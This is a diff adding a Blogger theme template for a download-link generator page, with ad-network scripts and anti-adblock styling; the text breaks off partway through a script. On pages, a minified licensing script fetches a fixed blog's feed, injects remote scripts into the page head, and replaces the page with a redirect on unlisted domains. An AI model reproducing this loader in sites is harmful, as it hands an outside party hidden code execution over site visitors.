@@ -1,0 +1,1705 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE html>
+<html b:css='false' b:defaultwidgetversion='2' b:layoutsVersion='3' expr:dir='data:blog.languageDirection' expr:lang='data:blog.locale' js='no-js' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>&lt;!--/**
+*
+* Author : NIADZGN
+* URL 	 : https://niadzgn.blogspot.com/
+*
+*/<head>--&gt;<b:include name='body'/>&lt;head&gt;
+
+<meta content='width=device-width, initial-scale=1, user-scalable=yes, maximum-scale=1' name='viewport'/>
+<b:if cond='data:blog.pageType == &quot;error_page&quot;'>
+  <title>NIADZGN - <data:blog.title/></title>
+<b:else/>
+  <title><data:view.title.escaped/></title>
+</b:if>
+<b:include data='blog' name='all-head-content'/>
+<link href='//cdn.jsdelivr.net/gh/MohammadQt/Itheric@master/css/Bootstrap.rtl.css' rel='stylesheet' type='text/css'/>
+<link crossorigin='anonymous' href='https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css' integrity='sha384-CKHFSO+alj8INnPTr6aTHcZfWxiUMck+E/gmzluv3nw0QiPeBS2hRjV8ImTZS5Yd' rel='stylesheet'/>
+<script crossorigin='anonymous' integrity='sha384-a9xOd0rz8w0J8zqj1qJic7GPFfyMfoiuDjC9rqXlVOcGO/dmRqzMn34gZYDTel8k' src='https://cdn.rtlcss.com/bootstrap/v4.2.1/js/bootstrap.min.js'/>
+<script type='text/javascript'>
+//<![CDATA[
+//CSS Ready
+function loadCSS(e, t, n) { "use strict"; var i = window.document.createElement("link"); var o = t || window.document.getElementsByTagName("script")[0]; i.rel = "stylesheet"; i.href = e; i.media = "only x"; o.parentNode.insertBefore(i, o); setTimeout(function () { i.media = n || "all" }) }
+loadCSS("");
+loadCSS("//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css");
+//]]>
+</script>
+<script src='//code.jquery.com/jquery-2.1.4.min.js' type='text/javascript'/>
+<script src='//cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js'/>
+
+<script src='//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js'/>
+<script src='https://code.jquery.com/jquery-3.4.1.js'/>
+<b:skin version='1.0.0'><![CDATA[
+body{font-family:CaremFont,sans-serif;}
+/* LAYOUT WIDGET */
+body#layout {width:100%}
+body#layout ul {display: none;}
+body#layout .layouthide {display:none}
+
+]]></b:skin>
+<b:template-skin><![CDATA[
+body#layout:before { content: ' niadzgn.blogspot.com '; position: absolute; top: 42px; right: 7px; z-index: 1; padding: 5px 10px; font-size: 15px; font-family: Cairo; color: #fff; background: #5c80f6; border-radius: 5px; /* margin: -4px; */
+}
+body#layout {background-color: #e4e4e4; border: 0}
+body#layout div.section {background-color: #fff}
+body#layout .add_widget a {color: #3d5afe}
+body#layout .row:after {content:'';clear:both;display:block}
+body#layout .isHideLayout {display:none;}
+body#layout .col-md-3 {float:left;width:30%;}
+body#layout .col-md-6 {float:right;width:40%;}
+body#layout #page-setting {font-family:CaremFont,sans-serif;background: #fffcf2}
+body#layout div.section {font-family:CaremFont,sans-serif}
+  body#layout:after {content:&quot;  \U00000042\U00000075\U00000079\U00000020\U00000074\U00000068\U00000065\U00000020\U00000066\U00000075\U0000006C\U0000006C\U00000020\U00000076\U00000065\U00000072\U00000073\U00000069\U0000006F\U0000006E\U00000020\U00000066\U0000006F\U00000072\U00000020\U00000024\U00000035 @ niadzgn.blogspot.com&quot;; font-size: 13px; color: #ffffff; display: inline-block; background: #3d5afe; font-family: Cairo; padding: 10px; margin: 10px; border-radius: 5px;font-weight: 600;}
+
+
+]]></b:template-skin>
+
+<style type='text/css'>
+/*<![CDATA[*/
+.download-files {
+    margin-top: 50px;
+}
+.container-download{text-align:center}
+.container-download .table.table-bordered{margin:24px auto;font-size:13px;font-weight:600;color:#838fa1}
+.container-download #sharebuttons{list-style:none;margin:10px 20px 0;padding:0}
+.container-download #sharebuttons li{display:inline-block;margin:0 2px}
+.container-download #sharebuttons li a{display:block;width:30px;height:30px;background:#fff;border-radius:4px;color:#fff;font-size:17px;margin:0;text-align:center;line-height:30px}
+.container-download #sharebuttons li a.fb{background:#3b5998}
+.container-download #sharebuttons li a.tw{background:#1da0f2}
+.container-download #sharebuttons li a.vk{background:#4c75a3}
+.container-download .table.table-bordered
+ a{color:#3d5afe;font-weight:600}
+.container-download h2 {
+    display: block;
+    margin: 5px 0 10px;
+    padding: 20px;
+    color: #ffffff;
+    box-shadow: 0 3px 4px rgba(0, 0, 0, 0.2);
+    border-radius: 10px;
+    background: #3d5afe;
+    font-size: 20px;
+    font-weight: 600;
+}
+.container-download .skip-ads{margin:5px auto;overflow:hidden}
+.container-download .skip-ads button,.container-download .skip-ads a{position:relative;background:#ffffff;padding:0;display:inline-block;margin:20px 0 20px 5px;transition:all 0.3s ease;color:#3d5afe;text-decoration:none;padding:7px 11px 9px 22px;display:inline-block;font-size:13px;text-transform:none;font-weight:700;transition:all 0.3s ease;font-family:inherit;box-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);border-radius: 15px;}
+.container-download .skip-ads button{border:0}
+.container-download .skip-ads button #stimer,.container-download .skip-ads a i{background-color:#fe3231;color:#ffffff;padding:8px 0;width:25px;height:25px;line-height:11px;display:inline-block;border-radius:100px;text-align:center;font-size:11px;position:relative;transition:all 0.3s ease;margin-left:4px}
+.container-download .skip-ads button #stimer{margin:0 5px;padding-right:1px;padding-top:7px}
+.container-download #downloadbtn{color:#fff;background-color:#fe3231;border-color:#fe3231;display:inline-block;margin-bottom:0;font-weight:600;text-align:center;white-space:nowrap;vertical-align:middle;-ms-touch-action:manipulation;touch-action:manipulation;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;background-image:none;border:1px solid transparent;padding:8px 15px;line-height:3.5;border-radius:3px;font-family:inherit}
+.container-download .captcha-wrap{margin:22px auto;text-align:center;display:block;overflow:hidden}
+.container-download .captcha-wrap .g-recaptcha{text-align:center;margin:0 auto;display:inline-block}
+.container-download .alert-danger{color:#a94442;background-color:#f2dede;border-color:#ebccd1;padding:15px;margin-bottom:20px;border:1px solid transparent;border-radius:4px;width:300px;margin:9px auto;text-align:center}
+.box-shortener{margin:12px auto;text-align:center;overflow:hidden}
+.box-shortener i.fa-link{font-size:28px;background:#fe3231;padding:11px;color:#ffffff;border-radius:50px;width:50px;height:50px;margin:13px auto;-webkit-box-shadow:0 1px 3px 1px rgba(60,64,67,0.15),0 1px 2px 0 rgba(60,64,67,0.3);box-shadow:0 1px 3px 1px rgba(60,64,67,0.15),0 1px 2px 0 rgba(60,64,67,0.3)}
+.box-shortener .tools-quick{padding:8px}
+.box-shortener .tools-quick input{padding:1em;font-family:inherit;margin:8px auto;border-radius:10px}
+.box-shortener .tools-quick button{background:#fff;padding:10px 16px;border:0;font-family:inherit;cursor:pointer;-webkit-box-shadow:0 1px 3px 1px rgba(60,64,67,0.15),0 1px 2px 0 rgba(60,64,67,0.3);box-shadow:0 1px 3px 1px rgba(60,64,67,0.15),0 1px 2px 0 rgba(60,64,67,0.3);padding:7px 11px 9px 22px;font-size:14px;border-radius:50px;color:#3d5afe;font-weight:600;transition:all 0.3s ease}
+.box-shortener .result-short{text-align:center;border:0;margin:0 auto;margin-bottom:14px;width:76%;height:0;overflow:hidden;display:block;transition:all .4s ease-in-out}
+.box-shortener .result-short.done{height:40px;transition:all .4s ease-in-out;border: 2px solid #999;}
+.box-shortener .tools-quick button i{background-color:#3d5afe;color:#ffffff;padding:8px 0;width:25px;height:25px;line-height:11px;display:inline-block;border-radius:100px;text-align:center;font-size:11px;position:relative;transition:all 0.3s ease;margin-left:4px}
+.box-shortener .tools-quick button:hover{background:#3d5afe;color:#fff}
+.box-shortener .tools-quick button:hover i{background:#fff;color:#3d5afe}
+input.title-input.form-control:focus{border-color:#3d5afe;box-shadow:0 0 0 0.2rem rgba(0,123,255,0.5)}
+.table-bordered{border:none!important;margin-top:20px}
+input.name-input.form-control:focus{border-color:#28a745;box-shadow:0 0 0 0.2rem rgba(40,167,69,0.5)}
+input.short-input.form-control:focus{border-color:#dc3545;box-shadow:0 0 0 0.2rem rgba(220,53,69,0.5)}
+input.size-input.form-control:focus{border-color:#004085;box-shadow:0 0 0 0.2rem rgba(0,64,133,0.5)}
+input.qulty-input.form-control:focus{border-color:#ffc107;box-shadow:0 0 0 0.2rem rgba(255,193,7,0.5)}
+input.qulty-input.form-control{width:49%;float:left}
+input.size-input.form-control{width:49%;float:right}
+.paimall{background:#3d5afe;border-radius:10px;color:#fff;height:50px;overflow:hidden;float:none;vertical-align:middle;/* border:1px dashed #fff;*/
+    width:100%;margin:0 auto 10px;display:inline-block;vertical-align:-webkit-baseline-middle;vertical-align:middle;box-shadow:2px 3px 4px rgba(0,0,0,0.2),-2px 0 4px rgba(0,0,0,0.2)}
+.prim{float:right;vertical-align:middle;display:block;height:50px;outline:1px dashed #fff!important;line-height:50px;color:#fff;text-align:right;font-size:14px;font-weight:600;padding:0 10px;background:#fe3231;width:auto;vertical-align:-webkit-baseline-middle}
+.hlf{width:49%;display:block}
+.left{float:left!important}
+.right{float:right!important}
+.prim i.fa{font-size:20px;margin:0 0 0 5px!important}
+.scnd{text-align:center;vertical-align:middle;line-height:50px;font-weight:600}
+
+/*]]>*/
+</style>
+   
+<script src='https://www.google.com/recaptcha/api.js'/>
+<style type='text/css'>
+@font-face{font-family:wgd;src:url(data:application/font-woff;charset=utf-8;base64,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) format(&quot;woff&quot;);font-weight:400;font-style:normal}[class*=&quot; wgd-&quot;]:before,[class^=wgd-]:before{font-family:wgd!important;font-style:normal!important;font-weight:400!important;font-variant:normal!important;text-transform:none!important;speak:none;line-height:1;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.wgd-usd:before{content:&quot;\61&quot;}.wgd-eur:before{content:&quot;\62&quot;}.wgd-btc:before{content:&quot;\63&quot;}@-webkit-keyframes square{0%{-webkit-transform:translateY(0) scale(1.5) rotate(0);transform:translateY(0) scale(1.5) rotate(0);opacity:1}100%{-webkit-transform:translateY(-600px) scale(1) rotate(200deg);transform:translateY(-600px) scale(1) rotate(200deg);opacity:0}}@keyframes square{0%{-webkit-transform:translateY(0) scale(1.5) rotate(0);transform:translateY(0) scale(1.5) rotate(0);opacity:1}100%{-webkit-transform:translateY(-600px) scale(1) rotate(200deg);transform:translateY(-600px) scale(1) rotate(200deg);opacity:0}}.WgD-particles i{font-size:4em;font-weight:400;position:absolute;bottom:-100px;-webkit-animation:square 10s infinite;animation:square 10s infinite;-webkit-animation-duration:16s;animation-duration:16s}.WgD-particles i:nth-child(11),.WgD-particles i:nth-child(4),.WgD-particles i:nth-child(6),.WgD-particles i:nth-child(8){font-size:3em}.WgD-particles i:nth-child(10),.WgD-particles i:nth-child(2),.WgD-particles i:nth-child(3){font-size:2em}.WgD-particles i:nth-child(1){right:15%}.WgD-particles i:nth-child(2){right:24%;-webkit-animation-duration:8s;animation-duration:8s}.WgD-particles i:nth-child(3){right:50%;-webkit-animation-delay:5s;animation-delay:5s}.WgD-particles i:nth-child(4){right:40%;-webkit-animation-delay:7s;animation-delay:7s;-webkit-animation-duration:15s;animation-duration:15s}.WgD-particles i:nth-child(5){right:36%;-webkit-animation-delay:6s;animation-delay:6s}.WgD-particles i:nth-child(6){right:44%;-webkit-animation-delay:10s;animation-delay:10s;-webkit-animation-duration:20s;animation-duration:20s}.WgD-particles i:nth-child(7){right:58%;-webkit-animation-delay:2s;animation-delay:2s;-webkit-animation-duration:18s;animation-duration:18s}.WgD-particles i:nth-child(8){right:45%;-webkit-animation-duration:14s;animation-duration:14s}.WgD-particles i:nth-child(9){right:66%;-webkit-animation-delay:3s;animation-delay:3s;-webkit-animation-duration:12s;animation-duration:12s}.WgD-particles i:nth-child(10){right:74%;-webkit-animation-duration:25s;animation-duration:25s}.WgD-particles i:nth-child(11){right:80%;-webkit-animation-delay:4s;animation-delay:4s}body.ab-is-detected{overflow:hidden!important}#WgD{display:none;position:fixed;top:0;right:0;left:0;bottom:0;font-size:14px;-webkit-animation:wgdfade .3s;animation:wgdfade .3s;z-index:99999}#WgD.is-detected{display:block}@-webkit-keyframes wgdfade{from{opacity:0}to{opacity:1}}@keyframes wgdfade{from{opacity:0}to{opacity:1}}.WgD-position{position:absolute;top:50%;right:50%;-webkit-transform:translate(50%,-50%);transform:translate(50%,-50%);z-index:900}.WgD-title{margin:0 0 .5em}.WgD-text{margin:0;font-weight:400}.WgD-reload{text-decoration:none;display:inline-block;margin-top:2em;font-weight:500;transition:-webkit-transform .3s;transition:transform .3s;transition:transform .3s,-webkit-transform .3s}.WgD-reload:hover{color:#fff;-webkit-transform:scale(1.05);transform:scale(1.05)}.WgD-container img{max-width:100%;margin-bottom:1em;-o-object-fit:cover;object-fit:cover}
+#WgD{font-family:inherit;background:#547fff;background:linear-gradient(to left,#547fff,#50efff)}
+.WgD-particles i{color:rgba(0,0,0,0.2)}
+.WgD-container{-webkit-animation:bounceIn 1s;animation:bounceIn 1s}
+.WgD-container{padding:3.2em;max-width:450px;background-color:#fff;box-shadow:0 2px 6px rgba(0,0,0,0.2),0 10px 20px rgba(0,0,0,0.1);text-align:center;line-height:1.5;/*interlineado*/
+   border-radius:10px;color:#37474F}
+.WgD-title{font-size:1.6em}
+.WgD-text{font-size:1.2em}
+.WgD-reload{box-shadow:rgba(0,0,0,.12) 0 3px 13px 1px;color:#fff;padding:1em 1.5em;background:#549fff;border-radius:3px}
+
+.adspost{display:block;width:100%;padding:10px 0;margin:42px 0 0 auto;text-align:center;}
+.adspost img {max-width: 100%;}
+/* BODY */
+  *{outline:none!important}
+html,body{height:100%}
+a:hover{text-decoration:none!important}
+.overflow-hidden{overflow:hidden}
+.trans{-webkit-transition:all .5s ease-in-out;-moz-transition:all .5s ease-in-out;-ms-transition:all .5s ease-in-out;-o-transition:all .5s ease-in-out;transition:all .5s ease-in-out}
+.hidding-smooth{position:relative;height:6vh;overflow:hidden}
+.hidding-smooth:after{-webkit-transition:ease 0.8s;-moz-transition:ease 0.8s;-ms-transition:ease 0.8s;-o-transition:ease 0.8s;transition:ease 0.8s;position:absolute;bottom:0;left:0;right:0;content:&#39;&#39;;background:linear-gradient(180deg,transparent,white 70%);width:100%;height:5vh}
+.hidding-smooth:hover:after{height:1px}
+#fullpage{min-height:100%;margin:0 0 -120px 0;padding:0 0 120px 0}
+footer.footer{height:120px;background-color:#ffffff;border-top:1px solid #dee2e6}
+.sticky-top{top:calc(60px + 1rem)}
+@media (max-width:767px){.order-custom{-webkit-box-ordinal-group:2;-ms-flex-order:1;order:1}}
+.copysuccess{display:none}
+@font-face{font-family:&#39;CaremFont&#39;;font-style:normal;font-weight:400;font-weight:500;src:local(&#39;Careem&#39;),local(&#39;Careem-Light&#39;),url(https://cdn.jsdelivr.net/gh/MohammadQt/font-itheric@master/Careem-Light.woff2) format(&#39;woff&#39;);unicode-range:U+0600-06FF,U+200C-200E,U+2010-2011,U+204F,U+2E41,U+FB50-FDFF,U+FE80-FEFC}@font-face{font-family:&#39;CaremFont&#39;;font-style:normal;font-weight:600;src:local(&#39;Careem&#39;),local(&#39;Careem-Regular&#39;),url(https://cdn.jsdelivr.net/gh/MohammadQt/font-itheric@master/Careem-Regular.woff2) format(&#39;woff&#39;);unicode-range:U+0600-06FF,U+200C-200E,U+2010-2011,U+204F,U+2E41,U+FB50-FDFF,U+FE80-FEFC}@font-face{font-family:&#39;CaremFont&#39;;font-style:normal;font-weight:400;font-weight:500;src:local(&#39;Careem&#39;),local(&#39;Careem-Light&#39;),url(https://cdn.jsdelivr.net/gh/MohammadQt/font-itheric@master/Careem-Light.woff2) format(&#39;woff&#39;);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:&#39;CaremFont&#39;;font-style:normal;font-weight:600;src:local(&#39;Careem&#39;),local(&#39;Careem-Regular&#39;),url(https://cdn.jsdelivr.net/gh/MohammadQt/font-itheric@master/Careem-Regular.woff2) format(&#39;woff&#39;);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}@font-face{font-family:&#39;CaremFont&#39;;font-style:normal;font-weight:700;font-weight:Bold;src:local(&#39;Careem&#39;),local(&#39;Careem-MEDIUM&#39;),url(https://cdn.jsdelivr.net/gh/MohammadQt/font-itheric@master/Careem-Bold.woff2) format(&#39;woff&#39;);unicode-range:U+0600-06FF,U+200C-200E,U+2010-2011,U+204F,U+2E41,U+FB50-FDFF,U+FE80-FEFC}@font-face{font-family:&#39;CaremFont&#39;;font-style:normal;font-weight:700;font-weight:Bold;src:local(&#39;Careem&#39;),local(&#39;Careem-MEDIUM&#39;),url(https://cdn.jsdelivr.net/gh/MohammadQt/font-itheric@master/Careem-Bold.woff2) format(&#39;woff&#39;);unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}
+</style>
+
+<script>
+/*<![CDATA[*/
+function kodein_checkelement(e){return document.getElementById(e)?1:0}function kodein_insertelement(e,n,t){var r=n.parentNode;"after"==t&&r.insertBefore(e,n.nextSibling),"before"==t&&r.insertBefore(e,n)}function kodein_moveElement(e,n,t,r,i,o){if(!kodein_checkelement(r))return!1;var m=document.getElementById(i),d=m.getElementsByTagName(n),l=document.getElementById(r);if(0==t||d.length<0||d.length<t)return m.insertAdjacentElement(o,l),!1;kodein_insertelement(l,d[t-=1],e)}
+function kodein_MoveByID(e,n){var t=document.createDocumentFragment();t.appendChild(document.getElementById(e)),document.getElementById(n).appendChild(t)}
+/*]]>*/
+</script>
+&lt;!--</head>--&gt;&lt;/head&gt;
+&lt;body itemscope=&#39;itemscope&#39; itemtype=&#39;http://schema.org/WebPage&#39;&gt;
+<div id='fullpage'>
+  <div class='container-semifluid'>
+    <div class='holder'>
+      <nav class='navbar navbar-expand border-bottom navbar-dark bg-primary fixed-top py-2' data-type='fixednav'>
+        <div class='container'>
+          <a class='navbar-brand' expr:href='data:blog.homepageUrl'><data:blog.title/></a>
+          <button aria-controls='navbarSupportedContent' aria-expanded='false' aria-label='Toggle navigation' class='navbar-toggler' data-target='#navbarSupportedContent' data-toggle='collapse' type='button'>
+            <span class='navbar-toggler-icon'/>
+          </button>
+
+          <div class='collapse navbar-collapse justify-content-end' id='navbarSupportedContent'>
+            <ul class='navbar-nav ml-auto '>
+		<form class='form-inline mr-2 ml-2'>
+    <a class='btn btn-sm btn-outline-light' href='https://niadzgn.blogspot.com/' type='button'><b>NIADZGN</b></a>
+  </form>
+			 
+              <li class='nav-item dropdown'>
+                <a aria-expanded='false' aria-haspopup='true' class='nav-link dropdown-toggle px-0' data-toggle='dropdown' href='#' id='navbarDropdown' role='button'>
+                  List
+                </a>
+                <ul aria-labelledby='navbarDropdown' class='dropdown-menu dropdown-menu-right' itemprop='mainEntity' itemscope='itemscope' itemtype='http://schema.org/SiteNavigationElement'>
+                  <li class='dropdown-item'><a href='https://niadzgn.blogspot.com/p/contant-us.html' itemprop='url'><span itemprop='name'>Contact us</span></a></li>
+                  <li class='dropdown-item'><a href='https://niadzgn.blogspot.com/p/about-us.html' itemprop='url'><span itemprop='name'>Who are we?</span></a></li>
+                 
+                </ul>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </nav>
+    </div>
+    <div class='container py-3'>
+      <div id='isihalaman'>
+
+
+         <b:section cond='data:view.isHomepage' id='Download page link' maxwidgets='2'>
+           <b:widget id='HTML2' locked='false' title='' type='HTML' visible='false'>
+             <b:widget-settings>
+               <b:widget-setting name='content'><![CDATA[<script type="text/javascript" src="https://uprimp.com/bnr.php?section=General&pub=481715&format=300x50&ga=g&mbtodb=1"></script>
+<noscript><a href="https://yllix.com/publishers/481715" target="_blank"><img src="//ylx-aff.advertica-cdn.com/pub_zn9ugf.png" style="border:none;margin:0;padding:0;vertical-align:baseline;" alt="ylliX - Online Advertising Network" /></a></noscript>]]></b:widget-setting>
+             </b:widget-settings>
+             <b:includable id='main'>
+  <b:include name='widget-title'/>
+  <div class='widget-content'>
+    <data:content/>
+  </div>
+</b:includable>
+           </b:widget>
+           <b:widget id='HTML696' locked='false' title='2x Adsense' type='HTML' version='2' visible='true'>
+             <b:widget-settings>
+               <b:widget-setting name='content'>https://linkvibe-niadzgn.blogspot.com/p/redirect.html</b:widget-setting>
+             </b:widget-settings>
+             <b:includable id='main'>
+             <script>
+$(document)
+        .ready(function() {
+                $(&quot;.download-files&quot;)
+                        .each(function() {
+                                var s = $(this),
+                                        t = s.data(&quot;path&quot;),
+                                        d = s.attr(&quot;data-key&quot;),
+                                        a = {};
+                                document.location.search.replace(/\??(?:([^=]+)=([^&amp;]*)&amp;?)/g, function() {
+                                        function t(t) {
+                                                return decodeURIComponent(t.split(&quot;+&quot;)
+                                                        .join(&quot; &quot;))
+                                        }
+                                        a[t(arguments[1])] = t(arguments[2])
+                                });
+                                var l = a.url,
+                                        e = a.title,
+                                        i = a.size,
+                                        n = a.name,
+                                        o = a.date,
+                                        q = a.qulty,
+                                        r = document.location,
+                                        c = (c = Date(Date.now()))
+                                        .toString();
+                                if (0 == t || t || history.replaceState(null, &quot;&quot;, &quot;&quot; + window.location.pathname), l) {
+                                } else s.html(&#39;&lt;div class=&quot;box-shortener&quot;&gt;&lt;i class=&quot;fa fa-link&quot; aria-hidden=&quot;true&quot;&gt;&lt;/i&gt;&lt;div class=&quot;tools-quick&quot;&gt;&lt;input class=&quot;title-input form-control&quot; name=&quot;title&quot; placeholder=&quot;&#1622;File name&quot; required=&quot;&quot; type=&quot;text&quot;&gt;&lt;input class=&quot;name-input form-control&quot; name=&quot;title&quot; placeholder=&quot;The name of the person who uploaded the file&quot; required=&quot;&quot; type=&quot;text&quot;&gt;&lt;input class=&quot;short-input form-control&quot; name=&quot;url&quot; placeholder=&quot;Put the link here &quot; required=&quot;&quot; type=&quot;text&quot;&gt;&lt;input class=&quot;size-input form-control&quot; name=&quot;size&quot; placeholder=&quot;size &quot; required=&quot;&quot; type=&quot;text&quot;&gt;&lt;input class=&quot;qulty-input form-control&quot; name=&quot;text&quot; placeholder=&quot;Quality &quot; required=&quot;&quot; type=&quot;text&quot;&gt;&lt;input  class=&quot;result-short form-control&quot; id=&quot;result-short&quot;&gt;&lt;/input&gt;&lt;button class=&quot;short-now&quot; type=&quot;submit&quot; &gt;&lt;i class=&quot;fa fa-download&quot;&gt;&lt;/i&gt; Create a download link&lt;/button&gt;&lt;/div&gt;&lt;/div&gt;&#39;), $(&quot;.short-now&quot;)
+                                        .click(function(t) {
+                                                t.preventDefault(), $(&quot;.result-short&quot;)
+                                                        .val(&#39;<data:content/>&#39;+ &quot;?url=&quot; + Base64.encode($(&quot;.short-input&quot;)
+                                                                .val()) + &quot;&amp;?size=&quot; + Base64.encode($(&quot;.size-input&quot;)
+                                                                .val()) + &quot;&amp;?name=&quot; + Base64.encode($(&quot;.name-input&quot;)
+                                                                .val()) + &quot; &amp;?title=&quot; + Base64.encode($(&quot;.title-input&quot;)
+																.val()) + &quot; &amp;?qulty=&quot; + Base64.encode($(&quot;.qulty-input&quot;)
+                                                                .val()) + &quot;&amp;?date=&quot; + Base64.encode(c))
+                                                        .addClass(&quot;done&quot;)
+                                        }), document.getElementById(&quot;result-short&quot;)
+                                        .onclick = function() {
+                                                this.select(), document.execCommand(&quot;copy&quot;)
+                                        }
+                        })
+        });
+</script>
+            </b:includable>
+           </b:widget>
+         </b:section>
+
+<b:if cond='data:view.isPage'>
+  <script>
+//<![CDATA[
+$(document).ready(function() {
+var idBlog= "7233058231123643556"; // The ID of the blog on which the activation panel is placed
+$(function(){"use strict";$.ajax({dataType:"json",url:"https://www.blogger.com/feeds/"+idBlog+"/pages/default?alt=json-in-script",method:"GET",dataType:"jsonp",success:function(e){var t;for(t=0;t<e.feed.entry.length;t+=1){var n=$(e.feed.entry[t].content.$t);if(0===t&&!$("body").hasClass("error_page")){for(var o=n.find("li"),d=[],a=0;a<o.length;a+=1)d.push($(o[a]).text());var r,i=window.location.hostname.toLowerCase(),f=window.location.href.toLowerCase(),s=d.length-1;for(r=0;r<d.length;r+=1){if(-1!=i.indexOf(d[r])){var l=$(e.feed.entry[t].content.$t).find("script"),p=$(e.feed.entry[t].content.$t).find("style");$("head").append(p),$("head").append(l);break}r==s&&-1==f.indexOf("post-preview")&&-1==f.indexOf("www.blogger")&&-1==f.indexOf("b/layout-preview")&&-1==f.indexOf("b/preview")&&-1==f.indexOf("translate.google")&&-1==f.indexOf("webcache.googleusercontent")&&-1==f.indexOf("template-editor")&&$("html").html(n.find(".redirect").html())}}if(1===t){p=$(e.feed.entry[t].content.$t).find("style");$("head").append(p)}}}})});});
+$(document)
+        .ready(function() {
+                $(".download-files")
+                        .each(function() {
+                                var s = $(this),
